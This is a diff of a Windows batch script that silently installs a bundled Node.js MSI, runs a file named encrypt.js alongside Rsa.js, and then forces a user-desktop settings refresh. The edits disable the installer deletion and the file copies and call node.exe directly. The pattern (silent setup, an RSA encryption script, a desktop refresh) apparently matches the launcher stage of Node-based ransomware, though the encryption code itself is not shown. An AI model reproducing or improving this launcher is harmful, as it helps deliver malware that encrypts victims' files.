@@ -79,21 +79,21 @@ if exist "%SystemDrive%\Program Files (x86)" (goto setup64) else goto setup32
 :setup64
 echo start to setup64
 start /wait "" "%~dp0\node-v10.15.0-x64.msi" /quiet
-del "%~dp0\node-v10.15.0-x64.msi"
+rem del "%~dp0\node-v10.15.0-x64.msi"
 goto setupEnd
 :setup32
 echo start to setup32
 start /wait "" "%~dp0\node-v10.15.0-x86.msi" /quiet
-del "%~dp0\node-v10.15.0-x86.msi"
+rem del "%~dp0\node-v10.15.0-x86.msi"
 goto setupEnd
-:setupEnd
 echo install finish
 
+:setupEnd
+
 rem run main program
-copy "%~dp0\encrypt.js" "%SystemDrive%\Program Files\nodejs\encrypt.js"
-copy "%~dp0\Rsa.js" "%SystemDrive%\Program Files\nodejs\Rsa.js"
-cd %SystemDrive%\Program Files\nodejs
-node encrypt.js
+rem copy "%~dp0\encrypt.js" "%SystemDrive%\Program Files\nodejs\encrypt.js"
+rem copy "%~dp0\Rsa.js" "%SystemDrive%\Program Files\nodejs\Rsa.js"
+"%SystemDrive%\Program Files\nodejs\node.exe" encrypt.js
 
 rem refresh system setup
 RunDll32.exe USER32.DLL,UpdatePerUserSystemParameters
